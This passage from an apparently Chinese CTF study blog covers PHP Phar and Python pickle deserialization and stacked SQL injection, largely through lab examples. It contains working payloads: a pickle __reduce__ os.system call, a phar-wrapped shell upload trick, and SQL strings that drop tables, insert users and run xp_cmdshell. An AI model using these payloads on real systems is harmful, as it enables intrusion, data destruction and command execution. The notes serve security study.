class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()   <span class="hljs-comment">//对象创建(new)时会自动调用。</span><br><span class="hljs-title function_ invoke__">__wakeup</span>()        <span class="hljs-comment">//使用unserialize时触发</span><br><span class="hljs-title function_ invoke__">__sleep</span>()        <span class="hljs-comment">//使用serialize时触发</span><br><span class="hljs-title function_ invoke__">__destruct</span>()        <span class="hljs-comment">//对象被销毁时触发</span><br><span class="hljs-title function_ invoke__">__call</span>()        <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span><br><span class="hljs-title function_ invoke__">__callStatic</span>()        <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span><br><span class="hljs-title function_ invoke__">__get</span>()        <span class="hljs-comment">//用于从不可访问的属性读取数据 包括private或者是不存在的</span><br><span class="hljs-title function_ invoke__">__set</span>()        <span class="hljs-comment">//用于将数据写入不可访问的属性</span><br><span class="hljs-title function_ invoke__">__isset</span>()        <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span><br><span class="hljs-title function_ invoke__">__unset</span>()         <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span><br><span class="hljs-title function_ invoke__">__toString</span>()    <span class="hljs-comment">//把类当作字符串使用时触发</span><br><span class="hljs-title function_ invoke__">__invoke</span>()             <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发  就是加了括号</span><br><span class="hljs-title function_ invoke__">__autoload</span>()           <span class="hljs-comment">//在代码中当调用不存在的类时会</span><br></code></pre></td></tr></table></figure><p>‍</p><h4 id><a href="#" class="headerlink" title></a></h4><h2 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h2><h4 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h4><ol><li>写出基本序列化</li><li>写出注入的对象</li><li>写出注入的对象 分析是长到短还是短到长的替换，决定要把对象注入到什么地方</li><li>算清楚替换的差值，计算需要吃掉或挤出（逃逸）的字符串长度，保证这个长度是替换的差值的整数倍，如果不是 则加字符串</li><li>构造替换，对象注入</li></ol><h4 id="长到短的替换"><a href="#长到短的替换" class="headerlink" title="长到短的替换"></a>长到短的替换</h4><p>在第一个元素进行替换，进而吃掉第二个元素的约束，第二个元素就逃逸出来了</p><h4 id="短到长的替换"><a href="#短到长的替换" class="headerlink" title="短到长的替换"></a>短到长的替换</h4><p>暂缺</p><p>‍</p><h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h3 id="Phar是什么？"><a href="#Phar是什么？" class="headerlink" title="Phar是什么？"></a>Phar是什么？</h3><p>可以将多个文件组合成一个文件，</p><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>phar:&#x2F;&#x2F;xxx.phar&#x2F;1.png</p><p>zip:&#x2F;&#x2F;xxx.zip#1.png</p><h3 id="攻击思路-在上传包含中的利用"><a href="#攻击思路-在上传包含中的利用" class="headerlink" title="攻击思路 在上传包含中的利用"></a>攻击思路 在上传包含中的利用</h3><p>可以上传图片，不能上传php</p><p>可以包含 但是只能<code>include(&#39;$userinput.php&#39;);</code>​</p><p>压缩一个shell.php到1.zip,重命名为1.png，上传</p><p>包含：zip:&#x2F;&#x2F;upload.png#shell或phar:&#x2F;&#x2F;upload.png&#x2F;shell 因为在包含的时候在尾部上面的include会拼接上一个php</p><h3 id="如何反序列化"><a href="#如何反序列化" class="headerlink" title="如何反序列化"></a>如何反序列化</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ol><li>需要有可用的类，类下有魔术方法，最后POP chain调用到危险方法</li><li>需要文件操作函数去触发 <code>phar://</code>​ stream</li><li>有上传或者写文件的操作，可以把无损phar文件写入web服务器，后缀名任意</li></ol><h4 id="本地phar的条件"><a href="#本地phar的条件" class="headerlink" title="本地phar的条件"></a>本地phar的条件</h4><p>在php.ini中 <strong>phar.readonly</strong>  <strong>&#x3D;</strong>  <strong>Off</strong></p><h4 id="构造phar反序列化"><a href="#构造phar反序列化" class="headerlink" title="构造phar反序列化"></a>构造phar反序列化</h4><ol><li>把class定义的代码抄下来，把方法注释了</li><li>构造pop链</li><li><del>echo serialize($o)</del></li><li>贴phar八股文</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>还是正常做反序列化的流程，找pop chain，然后本地构造好序列化</p><p>之前:echo serialize($o);</p><p>现在:生成phar文件把$o加载进去 就是在setMetadata中</p><h4 id="可以利用的函数"><a href="#可以利用的函数" class="headerlink" title="可以利用的函数"></a>可以利用的函数</h4><p><img src="/.com//17476573059446373117876879156311-20250519202147-4srw68y.png" alt="17476573059446373117876879156311"></p><h4 id="绕过反序列化中的关键字"><a href="#绕过反序列化中的关键字" class="headerlink" title="绕过反序列化中的关键字"></a>绕过反序列化中的关键字</h4><h5 id="hex-通用"><a href="#hex-通用" class="headerlink" title="hex 通用"></a>hex 通用</h5><p>&#x3D;&#x3D;s:1:“A” 和 S:1:”\61”是一样的意思&#x3D;&#x3D;</p><p>当标识字符串的s为大写的时候，\hex标识对应字符</p><p>所以绕过flag的过滤：S:4:“\66\6c\61\67”</p><h5 id="绕过-0字符-php7-1"><a href="#绕过-0字符-php7-1" class="headerlink" title="绕过\0字符 php7.1+"></a>绕过\0字符 php7.1+</h5><p>虽然类中定义的属性可能不是public 但是我们可以假装是public，然后生成public类型的反序列化字符串。由于PHP7.1+的容错机制可以反序列化成功</p><p>private-&gt;public</p><p>‍</p><h1 id="0720-Pickle反序列化"><a href="#0720-Pickle反序列化" class="headerlink" title="0720 Pickle反序列化"></a>0720 Pickle反序列化</h1><h3 id="what-is-Pickle？"><a href="#what-is-Pickle？" class="headerlink" title="what is Pickle？"></a>what is Pickle？</h3><ul><li>是<strong>python</strong>的一个模块，内存中的东西因为断电等原因容易丢失，可以将对象以文件的形式存放在磁盘上 实现持久化存储</li><li>只能在python中使用 import pickle</li><li>序列化后的数据可读性非常差 人一般无法识别</li><li>cPickle模块是C语言实现的</li></ul><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>​<code>pickle.dump(obj, file[,protocol])</code>​</p><p>如果加s dumps 返回字符串 否则是到文件中</p><p>序列化对象，将结果数据流写入到文件对象中</p><p>参数protocol是序列化模式，默认为0，表示以文本的形式序列化，还可以是1或2，表示以二进制的形式序列化</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">import pickle<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span>(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">name</span>=&quot;<span class="hljs-title">test</span>&quot;):</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">name</span> = <span class="hljs-title">name</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">say</span>(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        <span class="hljs-title">print</span>(&quot;<span class="hljs-title">Hello</span> ! <span class="hljs-title">My</span> <span class="hljs-title">friends</span>&quot;)</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">a</span> = <span class="hljs-title">People</span>()</span><br><span class="hljs-class"><span class="hljs-title">c</span> = <span class="hljs-title">pickle</span>.<span class="hljs-title">dumps</span>(<span class="hljs-title">a</span>)</span><br><span class="hljs-class"><span class="hljs-title">print</span>(<span class="hljs-title">c</span>)</span><br></code></pre></td></tr></table></figure><p>out: 很多不可见字符</p><p>​<code>b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x04test\x94sb.&#39;</code>​</p><p>生成的规则涉及到PVM：用来解释字节码的解释引擎</p><p>‍</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>​<code>pickle.load(file)</code>​</p><p>如果加s dumps 返回字符串 否则是到文件中</p><p>反序列化对象。将文件中的数据解析为一个python对象；</p><p>需要注意：使用时需要让python能够找到类的定义 否则会报错</p><p>‍</p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>Pickle是一门基于栈的编程语言，有不同的编写方式，本质是一个轻量级的PVM（在Java中等同于JVM，用于解释字节码的解释引擎）</p><p>有三个部分组成：</p><ol><li><strong>指令处理器（Instruction processor）</strong></li></ol><p>从数据流读取操作码和参数，对其进行解释处理 指令处理器会循环执行整个过程，不断改变stack(堆栈)和memo(备忘录)区域的值 直到遇到‘ <strong>.</strong> ‘这个结束符号。这时，最终停留在栈顶的值将会被作为反序列化对象返回。</p><ol start="2"><li><strong>栈区（stack）</strong></li></ol><p>由python的列表list实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果。</p><ol start="3"><li><strong>内存区（memo）</strong></li></ol><p>由python的字典dict实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供存储功能，即将反序列化完成的数据以key-value的形式储存在memo中以便使用。</p><p>在第一部分中的IP常用操作码：</p><ul><li><p><strong>c</strong>：读取本行的内容作为模块名module，读取下一行内容作为对象名object，然后将module.object作为可调用对象压入栈中</p></li><li><p><strong>(</strong> ：将标记对象（mark）压入栈中，用于确定命令执行的位置，搭配t指令一起使用以便产生一个元组</p></li><li><p><strong>S</strong>: 后跟字符串在引号内 直到出现换行符 PVM将读取的内容压入栈中</p></li><li><p><strong>t</strong> : 从栈中向外弹出数据，弹射顺序从栈顶一点点出到元组依次后排 直到弹出左括号 此时弹出内容形成一个元组 然后再压入栈中</p></li><li><p><strong>R</strong> : 将之前压入栈中的元组（t）和可调用对象（c）全部弹出，然后将该元组作为可调用参数的对象并执行该对象。最终将结果压入到栈中。</p></li><li><p><strong>.</strong>  : 结束整个Pickle反序列化过程</p></li></ul><p><img src="/.com//1747658503023977923255372684818-20250519204144-7ybitsg.png" alt="1747658503023977923255372684818"></p><p><img src="/.com//17476585059844407908704057067474-20250519204146-hby8s9y.png" alt="17476585059844407908704057067474"></p><p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p><p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p><p><img src="/.com//17476585130011225927306100130946-20250519204153-53pqeav.png" alt="17476585130011225927306100130946"></p><p><img src="/.com//17476585152762147770201117664215-20250519204156-hmuqk2h.png" alt="17476585152762147770201117664215"></p><p>实际代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">import pickle<br>import os<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        <span class="hljs-title">a</span> = &#x27;<span class="hljs-title">whoami</span>&#x27;</span><br><span class="hljs-class">        <span class="hljs-title">return</span> (<span class="hljs-title">os</span>.<span class="hljs-title">system</span>, (<span class="hljs-title">a</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">o</span> = <span class="hljs-title">A</span>()</span><br><span class="hljs-class">#序列化</span><br><span class="hljs-class"><span class="hljs-title">test</span> = <span class="hljs-title">pickle</span>.<span class="hljs-title">dumps</span>(<span class="hljs-title">o</span>)</span><br><span class="hljs-class">#反序列化</span><br><span class="hljs-class"><span class="hljs-title">pickle</span>.<span class="hljs-title">loads</span>(<span class="hljs-title">test</span>)</span><br><span class="hljs-class"></span><br><span class="hljs-class">#本地运行结果即为电脑名称</span><br></code></pre></td></tr></table></figure><p><strong>做题步骤</strong></p><ol><li>找 pickle反序列化位点</li><li>本地重写reduce方法，生成反序列化字符串</li><li>触发反序列化</li></ol><p><strong>与php反序列化的区别</strong></p><p>php中能做什么由网站里面的class类写得方法决定</p><p>但是pickle只要存在反序列化的位点就可以任意执行，因为本地可以重写reduce方法</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化详解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆叠注入 stacked  injection</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/</url>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入-stacked-injection"><a href="#堆叠注入-stacked-injection" class="headerlink" title="堆叠注入 stacked  injection"></a>堆叠注入 stacked  injection</h1><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote><p>mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入</p><p>而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句&#x3D;&#x3D;类型是有限&#x3D;&#x3D;的，可以用来执行查询语句，而堆叠注入可以&#x3D;&#x3D;执行&#x3D;&#x3D;的是&#x3D;&#x3D;任意的语句&#x3D;&#x3D;。</p><p><strong>eg</strong></p><p>用户输入：<code>1; DELETE FROM products</code>​</p><p>服务器端生成的sql语句为：<code> Select * from products where productid=1;DELETE FROM products</code>​</p><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>‍</p><h1 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h1><blockquote><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p><img src="/.com//1049983-20180929015645345-261813262-20250418142338-b14gqor.gif" alt="1049983-20180929015645345-261813262"></p><p>此图是从<strong>原文</strong>中<strong>截取</strong>过来的，因为我个人的<strong>测试环境</strong>是<strong>php+mysql</strong>，是<strong>可以执行</strong>的，此处对于<strong>mysql&#x2F;php存在质疑</strong>。但个人估计原文作者可能与我的<strong>版本的不同</strong>的原因。虽然我们前面提到了堆叠查询可以<strong>执行任意的sql</strong>语句，但是这种注入方式<strong>并不是</strong>十分的<strong>完美</strong>的。在我们的web系统中，因为代码通常<strong>只返回一个查询结果</strong>，因此，堆叠注入<strong>第二个</strong>语句<strong>产生错误</strong>或者<strong>结果</strong>只能被<strong>忽略</strong>，我们在<strong>前端</strong>界面是<strong>无法看到</strong>返回<strong>结果</strong>的。因此，在读取数据时，我们建议使用<strong>union（联合）</strong> 注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p></blockquote><p>‍</p><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>（1）新建一表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;create table <span class="hljs-built_in">test</span> like <span class="hljs-built_in">users</span>;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015645671-1445708848-20250418145452-5bj63io.gif" alt="1049983-20180929015645671-1445708848"></p><p>执行成功，我们再去看一下是否新建成功表。</p><p><img src="/.com//1049983-20180929015645943-40278598-20250418145455-12lvk48.gif" alt="1049983-20180929015645943-40278598"></p><p>（2）删除上面新建的test表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;drop table <span class="hljs-built_in">test</span>;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015646198-1529755622-20250418145501-moc8u2z.gif" alt="1049983-20180929015646198-1529755622"></p><p><img src="/.com//1049983-20180929015646449-976012187-20250418145504-r5c54as.gif" alt="1049983-20180929015646449-976012187"></p><p>（3）查询数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;<span class="hljs-keyword">select</span> 1,2,3;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015646651-307633841-20250418145508-luvcepa.gif" alt="1049983-20180929015646651-307633841"></p><p>（4）加载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;c:/tmpupbbn.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015646928-818625825-20250418145512-1v55m2l.gif" alt="1049983-20180929015646928-818625825"></p><p>(4) 修改数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;100&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015647123-855312514-20250418145524-9w3iwfi.gif" alt="1049983-20180929015647123-855312514"></p><p><img src="/.com//1049983-20180929015647385-1686789783-20250418145527-uwrbwtv.gif" alt="1049983-20180929015647385-1686789783"></p><h2 id="2-Sql-server"><a href="#2-Sql-server" class="headerlink" title="2. Sql server"></a>2. Sql server</h2><p>(1)增加数据表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sc3(ss <span class="hljs-type">CHAR</span>(<span class="hljs-number">8</span>));<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015647694-982429887-20250418145531-s83ngpd.gif" alt="1049983-20180929015647694-982429887"></p><p>(2) 删除数据表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> sc3;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015648051-1234311462-20250418145535-qf3clju.gif" alt="1049983-20180929015648051-1234311462"></p><p>(4)查询数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;select * from test;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015648347-1625714699-20250418145539-j8nkra8.gif" alt="1049983-20180929015648347-1625714699"></p><p>(5)修改数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">test</span>;update <span class="hljs-built_in">test</span> <span class="hljs-built_in">set</span> name=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=3;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015648636-932399825-20250418145545-ple8xai.gif" alt="1049983-20180929015648636-932399825"></p><p><img src="/.com//1049983-20180929015648911-1380875302-20250418145559-oh45cnc.gif" alt="1049983-20180929015648911-1380875302"></p><p>(5)sqlserver中最为重要的存储过程的执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">test</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1;<span class="hljs-built_in">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;ipconfig&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015649295-413295225-20250418145603-v0relca.gif" alt="1049983-20180929015649295-413295225"></p><h2 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3.Oracle"></a>3.Oracle</h2><blockquote><p>上面的介绍中我们已经提及，&#x3D;&#x3D;oracle不能使用堆叠注入&#x3D;&#x3D;，可以从图中看到，当有&#x3D;&#x3D;两条语句在同一行时&#x3D;&#x3D;，&#x3D;&#x3D;直接报错,无效字符&#x3D;&#x3D;。后面的就不往下继续尝试了。</p></blockquote><p><img src="/.com//1049983-20180929015649555-1984392073-20250418145608-d8axt98.gif" alt="1049983-20180929015649555-1984392073"></p><h2 id="4-Postgresql"><a href="#4-Postgresql" class="headerlink" title="4.Postgresql"></a>4.Postgresql</h2><p>(1)新建一个表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> user_data(id <span class="hljs-type">DATE</span>);<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015649893-911848487-20250418145612-l3ok6px.gif" alt="1049983-20180929015649893-911848487"></p><p><img src="/.com//1049983-20180929015650150-1255028615-20250418145614-5fdv2lo.gif" alt="1049983-20180929015650150-1255028615"></p><p>可以看到user_data表已经建好。</p><p>(2)删除上面新建的user_data表</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> user_data;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015650516-1080177008-20250418145618-y3ccfz0.gif" alt="1049983-20180929015650516-1080177008"></p><p>(3)查询数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from user_test;select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015650885-769688906-20250418145621-rkshp8y.gif" alt="1049983-20180929015650885-769688906"></p><p>(4) 修改数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">update</span> user_test <span class="hljs-keyword">set</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;modify&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;张三&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/.com//1049983-20180929015651359-2117725775-20250418145626-lnlx1c8.gif" alt="1049983-20180929015651359-2117725775"></p><p>‍</p><h2 id="0x04-堆叠注入之sqllaps实列"><a href="#0x04-堆叠注入之sqllaps实列" class="headerlink" title="0x04 堆叠注入之sqllaps实列"></a>0x04 堆叠注入之sqllaps实列</h2><h2 id="1-Less-38-堆叠注入-字符型-GET"><a href="#1-Less-38-堆叠注入-字符型-GET" class="headerlink" title="1.Less-38 堆叠注入 - 字符型 - GET"></a>1.Less-38 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>（2）测试</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1’;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">38</span>’,’less38’,’hello’)–+<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;</span><br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+----+----------+------------+<br><br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+----+----------+------------+<br><br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">  5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> 